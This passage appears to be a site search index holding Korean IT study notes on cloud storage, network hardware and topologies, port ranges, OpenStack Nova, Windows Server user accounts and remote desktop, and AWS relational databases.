제어 가능\n  CDN, Tanscoder 등 다양한 서비스는 Object Storage를 이용\n     Archive Storage    데이터 아카이빙 및 장기 백업에 최적화된 스토리지 서비스\n  Infrequent Data 백업 및 Archiving Data 보관을 주 목적으로 하는 스토리지\n  Object Storage 보다 데이터 저장 비용은 저렴, 데이터 처리 API 비용을 가격이 높음\n    콘솔, API(Swift, s3), CLI, SDK를 이용해 데이터 관리가 가능\n  데이터 최소 보관 기능없이 사용할 수 있음\n  오브젝트 생명주고 괸리\n  Sub Account 연동을 통한 권한 관리 기능 제공\n     NAS    다수의 서버에 공유하여 사용할 수 있는 스토리지\n  최소 500GB~ 최대 10TB (100GB단위)로 사용 가능\n  NAS 가용량 안에서 생성된 스냅샷 이미지를 이용해서 데이터에 대한 복구 기능 제공\n  NFS /CIFS 프로토콜을 제공\n  사설IP를 이용한 ACL 오픈으로 타 계정에서 서버에 마운트 가능\n     Data Teleporter    대용량 데이터 이전을 위한 효과적인 솔루션\n  대용량 데이터 (최대 100T) 이전을 위한 전용 어플라이선스 대여 서비스\n  네트워크 비용 절감, 안전하고 빠른 데이터 이관이 가능한 서비스\n  이관 데이터를 NCP Object Storage / NAS에 import\n       Backup   서버 내 파일 및 Preinstall DB에 대한 백업 설정   백업 요청서 작성하여 신청하고 서버에 Agent를 설치하면 끝 ( ncloud -\u0026gt; 고객지원 -\u0026gt; 자요 -\u0026gt; 백업요청서\n  백업수행주기로 8가지 옵션 제공\n  1회성\n  1일 1회 전체백업\n  1주 1회 전체백업\n  1주 1회 전체백업\u0026amp; 매일 증분 백업\n        "}),a.add({id:91,href:'/docs/infra/infra/infra04/',title:"Network",content:"Network    Network Equipment   기본적으로 네트워크를 구축하려면 네트워크 장비가 필요하며, 네트워크 장비에는 라우터와 스위치 등 다양한 장비가 있으므로 이에 대한 학습이 필요합니다.   Router    라우터는 수신한 패킷을 적절한 경로로 전송하는 네트워크로 장비로, 네트워크를 논리적으로 나누는 장비입니다.\n  인터넷은 전 세계에 걸친 하나의 거대한 네트워크이며, 인터넷에는 LAN(Local Area Network)라 불리는 무수한 로컬 네트워크가 있고, LAN끼리는 라우터라고 불리는 장비를 매개로 연결되어 집니다.\n  LAN에서 WAN(Wide Area Network)으로 날아가는 메시지가 발생하면 라우터를 통해서 다른 LAN의 라우터로 메시지를 전달(라우팅)으로 통신이 이루어집니다.\n  라우터는 패킷을 받으면 라우터는 패킷에 있는 목적지인 IP 주소를 보고 패킷을 적절한 라우터로 전송(라우팅)을 수행합니다. 라우터가 전송할 곳을 결정할 때는 라우터에 미리 설정된 라우팅 테이블(목적지 주소)를 참조하여 목적지까지 패킷을 전송합니다.\n  라우팅 테이블을 관리하는 방법에는 스태틱 라우팅과 다이내믹 라우팅이 있으며, 스태틱 라우팅은 라우터에 경로 정보를 수동을 등록하는 방법입니다. 주로 기업에서는 대부분 외부 라우터와의 접속 ISP(Internet Service Provider)이나 데이터 센터 내부의 라우터들 뿐으로, 이처럼 통신 경로가 제한된 때는 스태틱 라우팅이 최적이라 할 수 있습니다.\n  다이내믹 라우팅이란 이웃한 라우터와 통신해서 라우터끼리 경로정보를 자동으로 갱신하는 방법으로, 다이내믹 라우팅에는 RIP, OSPF, BGP 등이 있으며, ISP처럼 외부 라우터와의 접속이 자주 변화할 때는 다이내믹 라우팅이 최적이라 할 수 있습니다.\n     라우터 선택 포인트    ISP나 데이터센터 등 라우터를 연결하는 곳에서 제공되는 상위 회선의 인터페이스와 일치하는 WAN 인터페이스를 가질 것\n 예를 들어 상위 회선이 1000BASE-T 인터페이스라면 라투어의 WAN 인터페이스도 1000BASE-T를, 상위 회선이 10BASE-T라면 10BASE-T로 해야합니다.       WAN에서의 통신대역\n WAN측 통신 대역이 1Mbps에도 못 미친다면 WAN측 인터페이스는 1000BASE-T는 커녕 100BASE-TX로도 충분합니다.       스루풋\n 스루풋(Throughput)이란 단위 시간당 데이터 전송량을 가리키며, 라우터에 어느 정도 전송 속도를 요구할지 결정합니다. 통신량이 많으면 스루풋이 높고 빠른 라우터를 도입해야 하지만, 통신량이 그다지 많지 않을 경우 스루풋이 낮은 저가의 라우터로도 충분하다 할 수 있습니다.       보안 기능\n 라투어의 본래 역할은 패킷을 다른 네트워크에 라우팅하는 것이지만, 최근의 라우터는 장비에 보안 기능이 탑재되는 경우가 많으며, 여기서 의미하는 보안은 TCP,UDP 포트 번호와 IP 이외의 통신을 차단하는 필터링 기능 등이 있습니다       도입 비용\n 라우터 가격을 결정하는 중요한 요소 중 하나로 스루풋이 있으며, 1Gbps의 인터페이스를 가진 라우터가 있을 때, 고가인 라우터는 1Gbps에 가까운 스루풋이 나오지만 저가의 라우터는 절반 이하로 나올 때가 있으며, 일반적으로 라우터는 비쌀수록 여러 역할을 수행합니다.       L2와 L3 Switch   L2 Switch   L2 스위치란 이른바 업무용 스위칭 허브를 의미하며, L2 스위치에 프레임이 들어오면 L2 스위치는 목적지가 MAC 주소를 보고 적절한 포트로 스위칭을 수행합니다.\n  스이체 내에 기술된 MAC 주소 테이블에 해당하는 MAC주소가 없을 때는 LAN 내 전체에 브로드캐스트해서 응답이 있는 포트로 전송합니다.\n      L3 Switch   L3 스위치란 라우터 기능이 추가된 L2 스위치로 네트워크상에 흘러가는 패킷이 들어오면 L3 스위치는 목적지 IP주소를 보고 적절한 포트로 패킷을 전송하기 위해 라우팅을 수행합니다.\n  L3 스위치 내에 적힌 라우팅 테이블에 해당하는 IP 주소 혹은 네트워크 주소가 없을 때는 기본 게이트웨이에 연결되는 포트로 전송합니다.\n       스위치 선택 포인트    인터페이스 속도와 포트 수\n 우선적으로 필요한 최소한의 인터페이스 속도와 포트 수를 확보할 수 있는 지 확인해야 합니다.       지능형 또는 비지능형\n 지능형(intelligent) 스위치는 웹 접속 혹은 텔넷 접속으로 포트 설정을 변경하거나 스위치 상태 및 통신량을 확인할 수 있습니다.       스위칭 능력과 스위칭 용량\n  스위치의 가장 중요한 역할을 대량의 통신을 빠짐 없이 빠르게 전송하는 것으로, 스위칭 능력과 스위칭 용량을 파악하면 스위치 성능을 판단할 수 있습니다.\n  스위칭 능력 : 스위칭 속도를 나타내는 단위로 PPS(Packet Per Second), PPS는 1초에 얼마나 패킷을 처리할 수 있는지를 나타냅니다.\n  스위칭 용량 : 동시에 스위칭할 수 있는 양을 나타내는 단위로 BPS(Bit Per Second)가 있습니다. BPS는 1초에 어느 정도의 바이트 수를 처리할 수 있는 지를 나타냅니다.\n  와이어 스피드와 논블로킹 : 스위치에 탑재된 각 포트에 이론상 최대 통신량이 발생하는 상태를 와이어 스피드(wire speed)라 합니다.\n       하드웨어 처리와 소프트웨어 처리\n  사용하고자 하는 기능이 ASIC라 불리는 전용칩을 사용하는 하드웨어 처리인지, 그렇지 않으면 소프트웨어처리로서 CPU를 사용하는 처리인지 구별할 필요가 있습니다.\n  통신량이 소규모라면 하드웨어 처리든 소프트웨어 처리든 크게 차이가 나지 않지만, 통신량이 대규모 일 때는 소프트웨어 방식으로처리하면 CPU 사용률이 올라가서 스이칭 능력에 영향을 주기도 합니다.\n       L4와 L7스위치(로드 밸런서)를 선택합니다.\n  L4/ L7 스위치는 이른바 로드 밸런서(부하 분산 기능)이 달린 L3 스위치로, L4 스위치는 IP와 TCP/ UDP 포트를 보고 적절한 서버로 패킷을 전송합니다. 반면 L7 스위치는 URL을 보고 적절한 서버로 적절한 서버로 전송합니다.\n  L4/ L7 스위치이 특징은 부하를 분산할 때 서버가 살았는 지, 죽었는 지를 감시할 수 있습니다.\n  L4스위츠는 서버의 IP 주소와 TCP/UDP 포트의 조합을 일정 간격으로 감시해 TCP/ UDP포트로부터 응답이 없으면 그 포트의 기능을 정지됐다고 판단해 일시적으로 부하 분산 대상에서 제외합니다.\n  L7 스위치 또한 URL을 일정간격으로 감시하고 예정한 응답이 돌아오지 않으면 부하 분산 대상에서 제외합니다.\n  L4/ L7 스위치를 선택할 때 L2/ L3 스위치와 같은 업체 제품으로 하면 명령 체계가 통일되므로 관리에 용이합니다.\n       Network Topology   네트퉈크 설계는 조건가 환경에 따라 무수한 조합이 있지만, 그 중 자주 사용되는 몇 가지 패턴을 예시로 보여드리겠습니다.     Frontend\u0026amp; Backend 2계층 구조    중소 규모 IT 인프라에서는 웹 서버로 대표되는 프론트 엔드 계층과 데이터베이스 서버로 대표되는 백 엔드 게층의 2계층 구조 네트워크가 주로 사용됩니다.     Frontend\n  프론트 엔드 층은 토폴러지적으로 인터넷에 가까운 곳에 위차합니다.\n  서버에 글로벌 IP주소를 부여해서 인터넷과 직접 통신하는 경우 L4 스위치르 매개로 인터넷과 통신하는 경우가 있습니다.\n       Backend\n  백 엔드 계층은 토폴러지적으로 인터넷에서 먼 곳에 위치합니다.\n  백 엔드 계층에 놓인 서버에는 프론트 엔드 게층을 거쳐야만 엑세스가 가능하므로 백 엔드 계층에 위치한 서버는 외부에서의 직접 공격(해킹)을 받지 않게됩니다.\n       3계층 구조    3계층 구조는 주로 코어 계층, 디스트리뷰션 계층, 액세스 계층으로 내누어집니다.     코어 게층\n 코어 계층에는 디스트리뷰션 계층에서 오는 통신을 집약해 인터넷에 연결하여 기본적으로 네트워크 하나에 코어 계층 한 세트가 설치됩니다.       디스트리뷰션 계층\n 디스트리뷰션 계층에는 디스트리뷰션 계층의 통신을 집약해서 코어 계층에 연결하고 액세스 계층 간의 통신을 중계하니다.       엑세스 계층\n 엑세스 계층에는 서버에서 오는 통신을 집약해서 디스트리뷰션 층에 연결됩니다.       네트워크 패브릭 구조    네트워크 패브릭(Network Fabric)이란 네트워크 패브릭이란 액세스 계층의 L2 네트워크를 가상화하여 물리적으로 다른 랙이나 스위치를 논리적으로 한 네트워크로 보이게 하는 기술을 의미합니다.\n  최근에는 서버의 성능 향상 및 가상화의 보급으로 서버 한 대에서 입출력디는 트래픽이 증가하면서 네트워크 장비가 병목현상을 일으키는 상황이 증가하였습니다.\n  또한 기존의 3게층 구조에서는 네트워크 구성에 맞게 서버와 랙의 물리적인 배치를 결정할 필요가 있지만, 이 말은 처음에 네트워크 구성이 정해지면, 이후에는 네트워크 구성의 제약 속에서 서버와 랙의 물리적 배치를 결정해야만 한다는 것을 의미하기도 합니다.\n  이와 같은 문제들의 대한 해결책으로 서버와 스토리지 가상화에 이어, 최근에는 네트워크에서도 가상화가 이루어지고 있습니다.\n  네트워크 패브릭의 큰 장으로는 서버를 액세스하는 계층의 어느 L2 스위치에나 연결할 수 있게 되며, 이 장점은 서버와 랙의 물리적 제약으로부터 해방된다는 것을 의미합니다.\n   \u0026amp;nbsp.\n 네트워크 기본 용어    TCP/IP(Tansmssion Control Protocol/ Internet Protocol)\n TCP/IP는 오늘날 인터넷에서 일반적으로 이용되는 프로토콜로, 전 세계에서 TCP/IP가 표준으로 사용되고 있기에, 우리는 인터넷에 연결된 전 세계의 컴퓨터와 쉽게 통신할 수 있습니다.      OSI 참조모델      OSI 참조모델이란 국제표준화기구 ISO에 의해 책정된 컴퓨터가 가져야 할 통신 기능을 계층 구조로 나눈 모델을 의미하며, OSI 참조 모델에서는 통신 기능(통신 프로토콜)을 일곱 개의 레이어로 나누어 정의하고 있습니다.\n  상단의 L2, L3, L4, L7 스위치들은 OSI계층의 레이어를 나타냅니다.\n     TCP와 UDP\n  TCP는 연결 지향형 프로토콜이며 고품질 통신을 실현합니다. TCP에서는 데이터의 송신이 이루어지면 송싱한 패킷의 순성와 수신한 쪽에서 받을 때 순서가 다르면 순서를 바꾸고, 또는 일부 패킷이 유실되면 재전송하는 등의 기능이 있습니다.\n  단 TCP는 오버헤드가 크고 UDP와 비교하면 속도가 느리며, 웹이나 메일 등 확실하게 통신이 이뤄져야 하는 신뢰성이 필요한 애플리케이션에 주로 사용됩니다.\n  반면 UDP는 비연결형 프로토콜로 저품질이지만 속도가 빠른 특징을 가지고 있습니다. UDP에서는 연결을 지속하지 않고 일방적으로 데이터를 전송하며, 일방적으로 전송하므로 상대방이 그 정보를 수신한다는 보증이 없고, 또한 수신한 쪽에서 정보를 받았다고 응답하는 기능은 없습니다. UDP는 주로 음성 전화나 동영상 등 정보가 일부 유실되어도 문제없이 애플리케이션에서 이용됩니다.\n       3웨이 핸드쉐이크 : SYN와 ACK\n  TCP 연결에서는 3웨이 핸드쉐이크를 거쳐 TCP 연결을 확립합니다. UDP는 비연결형이므로 3웨이 핸드쉐이크를 하지 않습니다.\n  3Way HandShack\n       스위칭과 라우팅\n LAN 안에서 L2 스위치(가정용 L2 스위치는 스위칭 허브라 칭함)를 통한 통신을 스위칭이라 하며, 반면 라우터 혹은 L3 스위치를 통해 LAN과 LAN 사이를 거렻 통신하는 것을 라우팅이라 하니다.       IPv4와 IPv6\n 일반적으로 IPv4의 IP 주소는 xxx.xxx.xxx.xxx로 표기되면 8bit x 4 = 32bit로 구성되어집니다. 하지만 이와 같이 한정적인 주소로는 현재의 IP로 할당하기는 부족하여, 새로 등장한 것이 16진수로 되어 있는 IPv6입니다.       네트워크 인터페이스를 묶어 사용하기\n  주로 운영체제에서는 네트워크 인터페이스를 묶어서 사용할 수 습니다. 네트워크 인터페이스를 묶는 다는 것은 여러 개의 네트워크 인터페이스에 가은 IP 주소나 MAC 주소를 부여해서 Active-Active, 혹은 Active-Standby 구성으로 통신하도록 설정하는 구조를 뜻합니다. 네트워크 인터페이스를 묶으면 내장애성 및 사용대역을 증가하는 효과가 있습니다.\n  네트어크 인터페이스를 묶는 기능을 업체나 운영체제에 따라 용어가 다르며 아래는 자주 사용되느 용어를 나타냅니다.\n  본딩(Bonding) : 리눅스에서는 \u0026lsquo;본딩\u0026rsquo;이라는 용어를 사용합니다.\n  티밍(Teaming) : 복수의 NIC 업체에서는 \u0026lsquo;티밍\u0026rsquo;이라는 용어를 사용합니다.\n  링크 어그리게이션(Link Aggregation) : 네트워크 기능에서는 \u0026lsquo;링크 어그리게이션\u0026rsquo;이라는 용어를 사용 할 때가 많다.\n  이더채널(EtherChannel) : 시스코 시스템즈에서는 \u0026lsquo;이더채널\u0026rsquo;이라는 용어를 사용합니다.\n  포트 트랭킹(Port Tranking) : 얼라이드 텔레시스에서는 \u0026lsquo;포트 트랭킹\u0026rsquo;이라는 용어를 사용합니다.\n         인터넷 연결\n  인터넷에 연결하기 위해서 라우터 혹은 L3 스위치가 외부 네트워크 회선에 연결되어야 합니다.\n  자사에서 ISP의 회선을 끌어오거나 데이터 센터가 제공하는 네트워크 서비스를 이용해 코어 스위치와 데이터 센터의 스위치를 연결하는 방법 들이 있습니다.\n  중소 규모인 때는 데이터 센터가 제공하는 네트워크 서비스를 이용하는 편이 손쉽기 때문에 비용면에서 장점이 될 수 있지만, 대규모인 때는 직접 회선을 끌어오는 것이 비용면에서 유리할 뿐 아니라 서비스 수준을 직접 관리할 수 있는 장점이 있습니다.\n       네트워크 케이블   네트워크에서는 케이블이 대량으로 이용되며, 사용용도에 따라 여러 타입과 특징을 가지고 있습니다.   LAN 케이블    일반적으로 사용되는 LAN 케이블은 UTP 케이블, 트위스트 페어 케이블, 이더넷 케이블 등 다양한 이름이 있습니다.\n  이더넷이 고속화됨에 따라 LAN 케이블도 점점 새로운 규격이 등장하고 있으며, 현재 주로 사용되는 규격은 다음과 같습니다.\n     LAN 케이블의 종류 CAT5e CAT6 CAT6A CAT7     통신속도 1Gbps 1Gbps 10Gbps 10Gbps   대응 인터페이스 10BASE-T, 100BASE-TX, 100BASE-T CAT5e와 동일 CAT5e와 동일 10BASE-T, 100BASE-TX, 100BASE-T, 10GBASE-T   전송대역 100MHz 250MHz 500MHz 600MHz     어느 LAN 케이블을 사용할지는 용도와 비용을 저울에 달아보고 판단해야 하며, 서버와 네트워크 장비의 연결에는 CAT5e로 충분하다 할 수 있습니다.     광파이버 케이블    기가바이트 네트워크에서 사용되는 주요 규격에는 1000BASE-SX와 1000BASE-LX가 존재합니다. 광섬유로는 멀티 모드 파이버, 혹은 싱글 모드 파이버가 사용됩니다.\n  멀티 모드 파이버는 전송 거리가 짧고 값이 싸지만, 싱글 모드 파이버는 전송 거리가 길고 가격이 비싼 특징이 있습니다.\n  1Gbps에서 사용되는 규격\n     규격 사용 매체 전송 거리 용도     1000BASE-SX 멀티 모드 파이버 550m LAN   1000BASE-LX 멀티 모드 파이버 550m 구내배선   1000BASE-LX 싱글 모드 파이버 5km 구내배선      광파이버 케이블의 양 끝에 사용되는 커넥터의 종류는 다양하지만 특히 SC 커넥터와 LC 커텍터가 주로 사용되며, 또한 광케이블 안에서는 광 신호가 전달되지만, 네트워크 장비 내부에서는 전기 신호로 전달되므로 광 신호화 전기 신호를변환하는 네트워크 장비로 트랜시버가 이용됩니다.\n  또한 최근에는 10Gbps와 40Gbps에 대응하는 규격도 등장했습니다.\n    "}),a.add({id:92,href:'/docs/network/network/portnumber/',title:"Network PortNumber",content:"TCP/ UDP 포트 번호 정리  기본적인 포트번호    Well-known port : 0 ~ 1023\n  Registered port : 1024 ~ 49151\n  Dynamic port : 49152 ~ 65535\n    \rPort Tables\r...\r\r  Register Port \r\r\r "}),a.add({id:93,href:'/docs/openstack/openstack/nova/',title:"Nova",content:"가상의 서버를 생성하는 서비스 : Nova   가상의 서버를 생성하는 서비스 : Nova   Nova는 compute 서비스의 핵심 compute 서비스란, 가상머신이 필요한 자원을 할당하고, 관리하는 서비스로 하이퍼바이저, 메시지 Queue, 인스턴스 접속을 하는 콘솔 등의 다양한 기능이 유기적으로 연결되어 가상 서버를 생성할 수 있는 시스템을 구성하는 시스템     Nova 서비스의 고려사항     고려사항 설명     CPU compute 서비스가 동작할 호스트 시스템의 cpu가 기본적으로 자체 하드웨어 가상화를 지원이 필수   Hypervisor 서비스에 사용할 하이퍼바이저를 맞게 설정해야 하며, 기본적으로 사용하는 Hypervisor은 KVM/QEMU   Storage compute 서비스를 통해 인스턴스가 생성되면서 시스템의 디스크 용량의 제한을 가할 수 있음, 이를 위해 넉넉한 공간이 필요   Overcommit 기본적으로 자원을 할당하는 경우 1:1이 아닌 CPU는 16:1, Memory는 1.5:1로 할당 되어짐   네트워킹 생성된 인스턴스의 경우 nova가 독자적으로 구현하는 것이 아닌 다른 network 서비스를 연게해서 사용해야하며, 주로 Neutron 네트워크 서비스와 함께 사용       Nova의 논리 아키텍처      서비스 역할     nova-api 최종 사용자즈이 API콜을 통해 서비스 간 질의 응답을 담당   nova-compute 가상화 API를 이용하여 가상 머신 인스턴스를 생성하고 종료하는 역할을 수행   nova-scheduler compute host가 다수인 경우 큐를 통해 받은 메시지를 누구에게 명령할 것인지를 결정   nova-conductor 코디네이션과 데이터베이스 쿼리를 지원하는 서버 데몬   nova-cert X509 인증서에 대한 Nova Cert서비스를 제공하는 서버 데몬   nova-consoleauth 데몬, 콘솔 프록시를 제공하는 사용자에 대한 인증 토큰 제공   Guest Agent 실제 compute 시스템 상에 구축된 인스턴스로 Nova-compute 서비스에 의해 제어되어짐   nova-api-metadata 인스턴스의 메타데이터의 요청을 처리   nova-novncproxy VNC 콘솔화면을 제공   nova-novaclient: nova REST API를 사용하는 클라이언트 프로그램    nova-network 인스턴스의 네트워크 기능을 수행   nova-compute-kvm 인스턴스(가상 머신)와 관련된 모든 프로세스를 처리   python-guestfs 파일 생성 기능을 지원하는 Python 라이브러리   qemu-kvm KVM 하이퍼바이저      위와 같이 많은 서비스들이 존재    Nova는 대시보드나 콘솔에서 호출하는 nova-api에서 시작 Queue를 이용해 nova-compute에 인스턴스를 생성하라는 명령을 전달 nova-compute는 하이퍼바이저 라이브러리를 이용해 하이퍼바이저에 인스턴스를 생성하려는 명령어를 전달 Hypervisor을 통해 인스턴스를 생성 생성된 인스턴스는 nova-api로 접근할 수 있으며 Nova의 모든 기능은 메시지 Queue로 처리할 수 있음     Nova가 지원하는 하이퍼바이저의 종류  기본 하이퍼바이저는 KVM과 QEMU 프로바이더가 테스트하는 Hyper-V, VMware, XenServer, Sen via libvirt 몇 번의 테스트만 하는 하이퍼바이저 드라이버인 베어메탈, Docker, LXC via libvirt    "}),a.add({id:94,href:'/docs/development/shell/shell-4/',title:"UNIX/ Linux 시스템 관리",content:"Shell Programming    UNIX/ Linux 시스템 관리         #\n"}),a.add({id:95,href:'/docs/system/window/window04/',title:"사용자 계정",content:"Windows Server 사용자 계정   사용자 계정    Windows는 여러 명의 사용자가 존재할 수 있고, 각 사용자마다 별도의 환경을 구성할 수 있습니다.\n  컴퓨터의 자원들에 대한 사용권한을 각 사용자마다 제한할 수 있습니다.\n  독립 실행형 서버에서 생성한 사용자 계정을 로컬 사용자 계정이라 부르며, 이 계정으로는 AD(Active Directory) 도메인에 로그온할 수 없으며 현재 컴퓨터의 자원에만 접근할 수 있습니다.\n  독립 실행형 서버의 경우 기본적으로 Administrato와 Guest 사용자가 있습니다.\n     그룹 계정    그룹은 간단히 여러 권한을 묶은 집합을 의미하며, 여러 권한을 묶어서 하나의 그룹으로 구성하는 것을 뜻합니다.\n  사용자를 그룹으로 묶는 이유는 주로 관리하기가 편해지기 때문입니다.\n  독립 실행형 서버에 해당하는 그룹을 로컬 그룹 계정이라합니다.\n  Windows Server 2016을 설치하면 자동으로 생성되는 그룹 계정이 있는 이를 기본 로컬 그룹이라 합니다.\n  주로 사용되는 기본 로컬 그룹\n     그룹 설명     Administrators 모든 권한을 가진 그룹   Backup Operators 파일을 백업하고 복구할 수 있는 권한   Guests 로그온 할 때 임시 프로필을 만들고 로그오프하면 삭제   Remote Desktop Users 컴퓨터에 원격 로그온할 수 있는 권한   Users 사용자 계정을 생성하면 기본적으로 소속되는 그룹, 시스템 수준에서 변경 불가능       로컬 사용자 계정 생성 및 관리    로컬 사용자를 생성해보기 위해 컴퓨터 관리 \u0026gt; 로컬 사용자 및 그룹 \u0026gt; 사용자를 선택합니다.\n  현재 활성화되어 있는 어드민과 다른 계정들은 활성화되어 있지 않는 것을 확인할 수 있습니다\n       유저를 생성하기위해 사용자에서 새 사용자를 선택합니다. Dkah1234의 암호로 User01을 생성하고, 암호를 변경할 수 없게 User02를 생성합니다. User03은 암호를 주지 않고 계정을 사용하지 못하게 생성합니다. 또한 유저에 대한 설정변경은 유저를 클릭하여 가능합니다.          이제 유저를 확인하기 이해 Alt + F4 로 로그아웃합니다.       로그인시 좌측 하단에 유저들을 확인할 수 있습니다. User03은 사용하지 않는 계정이라 나타나지 않음을 확인할 수 있습니다.       User01을 통해 로그인을 하면 다음과 같이 새로운 패스워드를 요구하는 것을 확인할 수 있습니다.     위와 같이 계정을 생성하여 권한을 제한함으로서, 보안적 요소를 높이는 것이 가능합니다.     원격설정    윈도우 서버 또한 일반적인 윈도우 운영체제와 같이 원격접속이 가능합니다.\n  이에 대한 설정을 위해 시스템 \u0026gt; 고급 시스템 설정 \u0026gt; 원격에서 원격접속을 설정합니다.\n       원격 데스크톱은 IP 뿐만 아닌 접속 포트도 알아야하며, 이를 확인하기 위해 제어판 \u0026gt; 시스템 및 보안 \u0026gt; 방화벽 \u0026gt; 고급설정 \u0026gt; 모니터링 \u0026gt; 방화벽에서 Remote를 확인합니다.          원격접속을 확인하기 위해 WINCLIENT에서 mstsc를 실행하여 FIRST의 IP인 192.168.10.11에 User02에 접속합니다.\n  하지만 비밀번호가 맞음에도 접속이 되지않는 데, 이는 유저권한은 원격접속에 대한 권한을 가지고 있지 않기 때문이며, 어드민으로 접근은 가능하지만, 보안상의 문제로 대부분 사용하지 않습니다.\n  여기서는 User02에 그룹을 변경하여 접속이 가능하도록 하여보겠습니다\n       FIRST 서버의 사용자계정으로 돌아가 User의 소속그룹을 추가합니다.       지금 찾기 \u0026gt; remote Desktop Users를 생성합니다.       다시 접속을 시도하면 접속이 되는 것을 확인하실 수 있습니다.       이상으로 기본적인 User 사용법에 대해 알아보았습니다.    "}),a.add({id:96,href:'/docs/aws/awssaa/saa-5/',title:"5장 데이터베이스",content:"5장 데이터베이스   5장의 목표   복원력을 갖춘 아키텍처 설계   안정적이고/ 복원력을 갖춘 스토리지를 선택한다.\n  어떻게 AWS 서비스를 사용해 결합 해제 매커니즘을 설계할지 결정한다.\n  어떻게 멀티 티어 아키텍처 솔루션을 설계할지 결정한다.\n  어떻게 고 가용성 및/ 내결함성을 갖춘 아키텍처를 설계할지 결정한다.\n      성능이 뛰어난 아키텍처 정의  성능이 뛰어난 스토리지 및 데이터베이스를 선택한다. 탄력성과 확장성을 갖춘 솔루션을 설계한다.       데이터베이스    데이터베이스를 사용하면 어플리케이션을 데이터를 저장하고 구성하며, 신속하게 검색할 수 있다.\n  단층 파일(Flat File)에 데이터를 저장할 수도 있지만, 데이터양이 증가하게 디면 검색 속도가 느려지는 단점이 있으며, 개발자는 데이터를 저장하고 검색하기 위해 직접 파일 시스템에서 작업하는 대신, 데이터베이스로 작업을 수행함으로써 애플리케이션 개발에 집중하는 것이 가능하다.\n  데이터베이스에 기반한 애플리케이션을 구현할 때, 애플리케이션의 가용성과 성능은 데이터베이스 선택과 구성 방법에 다려 있으며, 데이터베이스는 관계형과 비관계형 두 가지로 나뉘어 지며, 사용자는 데이터 저장, 구성, 검색 방법에 따라 애플리케이션에 가장 적합한 데이터베이스를 선택할 수 있다.\n  데이터베이스에 장애가 발생할 때 데이터를 보호 및 복구하는 방법 뿐이 아닌, 애플리케이션의 필요한 수준의 성능과 안정성을 얻기 위해 AWS가 제공하는 데이터베이스 서비스를 학습한다.\n     관계형 데이터베이스    관계형 데이터베이스는 하나 이상의 테이블을 포함한 열과 행이 있어 스프레드시트로 시각화가 가능한 데이터베이스를 의미한다.\n  관계형 데이터베이스 테이블에서 열은 속성, 행은 레코드 또는 튜플이라고 한다.\n    열과 속성    관계형 데이터베이스 테이블에 데이털르 추가하기 전에, 각 열의 이름과 입력될 데이터의 형식을 사전에 정의해야 한다.\n  열에는 순서가 있으며, 테이블을 생성한 후에는 이 순서를 변경할 수는 없다.\n  열의 순서를 정하려면 테이블에 있는 속성 간에 관계를 만들어야 하며, 여기에서 관계형 데이터베이스라는 용어가 등자하게 되었다.\n  하단은 테이블의 예시를 나타낸다.\n     사원 ID(숫자) 부서(문자열) 성(문자열) 이름(문자열) 셍일(날짜)     101 전산 Smith Charlotte 7-16-87   102 마케팅 Colson Thomas 7-4-00     데이터는 각 열에서 정의된 형식에 반드시 일치해야 하며, 이와 다르게 숫자에 문자열을 입력하는 등의 작업을 진행할 경우 오류가 발생하게 된다. 관계형 데이터베이스의 이점은 데이터를 어떻게 쿼리할지 이해할 필요가 없다는 것이며, 데이터가 일관된 형식으로 존재하는 한 필요한 데이털르 원하는 방식으로 얻기 위해 여러 쿼리를 가공할 수 있다. 관계형 데이터베이스는 임의의 열에 데이터를 쿼리하고 사용자가 데이터를 제공 방식을 지정해야 하는 애플리케이션에 적합하다.     다중 테이블 사용    모든 데이터를 단일 테이블에 저장하면 불피요한 중복이 생기기 때문에 데이터베이스가 불필요하게 커지고 쿼리 속도가 느려지므로, 일반적으로 애플리케이션은 다중 테이블을 연결해서 사용한다.\n  하단은 상단의 테이블을 원하는 자료를 모아 생성한 테이블이다.\n     부서 ID(숫자) 부서명(문자열)     10 전산   20 마케팅     사원 테이블의 각 사원 레코드에 부서명을 입력하는 대신 부서 테이블에 레코드를 하나를 생성한 후, 사원 테이블의 사원 ID를 통해 각 부서를 참조하는 것이 가능하다. 이러한 관계에서 부서 테이블은 상위 테이블(Prarent Table)이며, 사원 테이블은 하위 테이블(Child Table)이다. 사원 테이블의 부서 열에 있는 값은 부서 테이블의 부서 ID를 참조한다. 여기서 부서 ID는 기본 키(Primary Key)라 하며, 기본 키는 행을 고유하게 식별하기 위해서 테이블 내에서 유일해야 한다. 사원 테이블은 부서 ID를 외래 키(Foregin Key)로 참조한다. 데이터베이스가 여러 테이블의 열이 어떻게 연관됐는지 알 수 있도록 기본 키와 외래 키를 반드시 정해야 하며, 데이터베이스는 외래 키 제약 조건을 활성화해 하위 테이블이 외래 키를 참조할 때 해당 키가 상위 테이블에도 존재하는 지 확인해야 한다.     SQL    관계형 데이터베이스에서는 구조화 질의 언어 SQL(Structured Query Language)를 사용해 데이터를 저장하고 쿼리하고 유지 관리 작업을 수행하므로 SQL 데이터베이스라고 불린다.\n  SQL문은 관계형 데이터베이스 관리 시스템(RDBMS, Relational Database Management System) 마다 조금씩 차이가 있으며, 이는 주요 프로그래밍 언어들에 SQL 문을 만들고 데이터베이스에 입출력하는 라이브러리가 이기 때문으로, AWS 아키텍처로써 SQL까지는 알 필요는 없지만 AWS 관리형 데이터베이스에 작업하기 위한 일반적인 SQL 용어의 개념은 이해할 필요가 있다.\n     데이터 쿼리    SELECT 문은 SQL 데이터베이스에서 데이터를 쿼리하는 데 사용되며, 데이터베이스에서 조회하고 싶은 특정 열을 지정할 뿐 아니라 모든 열에서 값을 기반으로 쿼리가 가능하다.\n  테이블의 에측 가능한 구조와 외래 키 제약 조건을 사용해서 SELECT 문과 함께 JOIN 절을 사용해 여러 테이블의 데이터를 결합할 수 있다.\n     데이터 저장   INSERT 문을 사용하면 테이블에 직접 데이터를 삽입할 수 있으며, 대량의 레코드를 저장해야 할 때 COPY 명령을 사용하면 적절하게 형식을 ㅁ맞춘 파일에서 지정한 테이블로 데이터를 복사할 수 있다.     온라인 트랙잭션 처리와 온라인 분석 처리   관계형 데이터베이스는 구성에 따라 온라인 트랜잭션 처리(OLTP, OnLine Transaction Processing)과 온라인 분석 처리(OLAP, Online Analytical Processing)     OLTP    OLTP 데이터베이스는 초당 몇 회씩 순차적으로 데이터를 버번하게 읽고 쓰는 애플리케이션에 적합하며, OLTP 데이터베이스는 빠른 쿼리에 최적화 되어 있다.\n  OLTP 데이터베이스는 정기적이고 예측 가능한 경향이 있으며, 요구조건에 따라 메모리가 상당량 필요할 수 있으며, 이는 빠른 액세스를 위해 자주 사용하는 테이블의 일부를 메모리에 저장하기 